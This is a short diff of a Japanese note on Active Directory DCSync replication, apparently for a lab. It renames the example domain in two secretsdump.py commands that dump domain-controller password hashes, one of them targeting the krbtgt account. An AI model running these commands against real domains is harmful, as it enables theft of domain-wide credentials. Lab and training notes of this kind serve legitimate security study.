@@ -24,9 +24,9 @@ AD のドメインコントローラは、互いにディレクトリ情報を�
 ## コマンド
 
 ```
-secretsdump.py corp.local/administrator@<DC_IP> -just-dc
+secretsdump.py lab.local/administrator@<DC_IP> -just-dc
 # 特定ユーザーのみ
-secretsdump.py -just-dc-user krbtgt corp.local/administrator@<DC_IP>
+secretsdump.py -just-dc-user krbtgt lab.local/administrator@<DC_IP>
 ```
 
 ## 注意点
